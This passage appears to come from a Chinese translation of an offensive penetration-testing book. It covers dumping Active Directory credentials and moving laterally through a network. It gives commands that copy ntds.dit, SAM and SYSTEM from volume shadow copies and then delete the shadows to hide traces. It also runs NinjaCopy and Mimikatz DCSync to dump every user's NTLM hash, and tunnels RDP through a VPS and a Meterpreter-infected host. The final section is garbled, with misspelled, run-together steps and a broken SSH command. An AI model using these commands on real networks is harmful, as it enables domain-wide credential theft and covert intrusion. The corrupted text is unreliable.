  \ 的一个称为卷影复制服务（Volume Shadow Copy Service, VSS）的功能，它将创建卷的快照副本。然后我们可以从该副本中读取 `Ntds.dit`\
  \ 文件并将其从机器上提取出来。这将包括窃取 `Ntds.dit`、`System`、`SAM` 和 `Boot Key` 文件。最后，我们需要清理痕迹并删除卷副本：\n\
  \n*   `C:\\vssadmin create shadow /for=C:`\n\n\n\n\n\n- `copy \\\\?\\GLOBALROOT\\\
  Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\ntds\\ntds.dit`。\n\n- `copy\
  \ \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\\
  config\\SYSTEM`。\n\n- `copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\\
  windows\\system32\\config\\SAM`。\n\n- `reg save HKLM\\SYSTEM c:\\SYS`。\n\n- `vssadmin\
  \ delete shadows /for= [/oldest | /all | /shadow=]`。\n\nNinjaCopy\n\nNinja 是另一种工具，一旦在域控制器上运行，即可用于获取\
  \ Ntds.dit 文件。¹ 要运行此脚本，您必须是**管理员**。这可用于读取通常被锁定的 SYSTEM 文件（例如 ntds.dit）或注册表 hive。`http://bit.ly/2HpvKwj`\n\
  \n- `Invoke-NinjaCopy -Path \"c:\\windows\\ntds\\ntds.dit\" -LocalDestination \"\
  c:\\windows\\temp\\ntds.dit\"`。\n\nDCSync\n\n现在我们已经回顾了旧的从域控制器拉取哈希的方法——这需要您在 DC 上运行系统命令并通常在该机器上放置文件——让我们转向较新的方法。最近由\
  \ Benjamin Delpy 和 Vincent Le Toux 编写的 `DCSync` 被引入，改变了从域控制器转储哈希的游戏规则。DCSync 的概念是伪装成一个**DomainController（域控制器）**来请求该域中所有用户的哈希值。**请稍作回味**。这意味着只要您有权限，就不需要在域控制器上运行任何命令，也不需要向\
  \ DC Drop any files。\n\n要让 DCSync 工作，重要的是拥有从**DomainController（域控制器）**拉取哈希的适当权限。**通常限于域管理员、企业管理员**。[DCs\
  \ 组成员](https://search.itpro.ru/search/detail/IT?ID=1384072596)，以及任何拥有“复制更改”权限设置为**允许**(即，\"\
  **Replicating Changes All/Replicating Directory Changes**) 的用户。DCSync 将允许您的用户执行此类攻击。这一攻击最初在\
  \ Mimikatz 中开发完成，并可以使用以下命令运行:\n\n- `Lsadump::dcsync /domain:[YOUR DOMAIN] /user=[Account_to_Pull_Hashes]`\n\
  \n甚至更好，DCSync 被整合进了诸如 [PowerShell Empire](https://github.com/PowerShellEmpire)之类的工具之中，使其变得更加简单易用。\n\
  \nModule for **Empire**: `powershell/credentials/mimikatz/dcsync_hashdump`\n\n![images00126.jpg:\
  \ images/00126.jpeg]\n\n在查看 DCSync hashdump 时，我们可以看到**Active Directory（活动目录）**中所有用户的\
  \ [NTLM hashes](https://search.itpro.ru/search/detail/IT?ID=47)。此外，我们还有 `krbtgt`的\
  \ NTLM 哈希值，这意味着我们现在（或在未来活动中）可以执行 Golden Ticket attacks。\n\n## 通过 VPS 上的 RDP 进行横向移动\n\
  \n在当今世界，拥有大量的下一代杀毒软件的情况下，在计算机之间通过 WMI/PowerShell Remoting/PsExec 进行横向移动并不总是最佳选择。我们还看到一些组织记录所有\
  \ Windows 命令行提示符。为了绕过所有这些情况，有时我们需要回归基础来执行横向移动。**使用 VPS 服务器的问题在于**它只是一个外壳，没有 GUI\
  \ 接口。因此，我们将路由/代理/转发我们的流量从攻击主机，通过 **VPS（虚拟专用服务器）**，到受侵害的计算机，最后横向移动到下一个受害者。幸运的是我们要用原生的工具来完成这部分功能中的大多数工作。\n\
  \n![images00127.jpg: images/00127.jpeg]\n\n首先，我们需要设置一个 VPS 服务器，启用来自互联网的端口；配置**Metasploit**\
  \ with PTF（渗透测试框架）以及感染初始受害者的 Meterpreter。**我们可以用 Cobalt Strike 或其他框架来完成这些工作，但在这种情况下我们将使用\
  \ Meterpreter**。\n\n我们可以利用默认的 **SSH** 客户端使用局部端口转发`(-L)`。在这个场景中我在使用的 Mac 上操作，但是**这也可以在\
  \ Windows 或 Linux 系统上进行**。我们通过 SSH key 连接到 VPS。我们还在攻击机上配置本地端口（在此案例中为 3389 (RDP)），以将任何发送到该端口的流量转发到我们的\
  \ VPS。当通过该端口的流量被转发到我们的 VPS 时，它将该流量发送给 VPS 上的 localhost 的 3389 端口。**最后，我们需要在 VPS\
  \ 上设置一个监听** **port 3389 **(3389)的端口并使用 Meterpreter's Port Forward（端口转发）功能通过受侵害的受害者主机进行\
  \ Port forward.jpg)，将流量路由到受害者的系统。\n\n```\n1\\. Infect our victim with a Metricter\
  \ payload.\\n\n\n2\\. SSH from our attacker machine and set up local port forward\
  \ on oour attckkerr systerm listen\\non porr 3389 locally send all traffic destind\
  \ for that pport the VPS\\srts localhost ponrt orpnr 3380\n```\n\n- `ssh -i key.pem\
  \ ubuntu@VPS IP`  \n127.0.0.1:3389:127.0.0.1:3389**\n\n![images/00128.jpeg](img/465_\
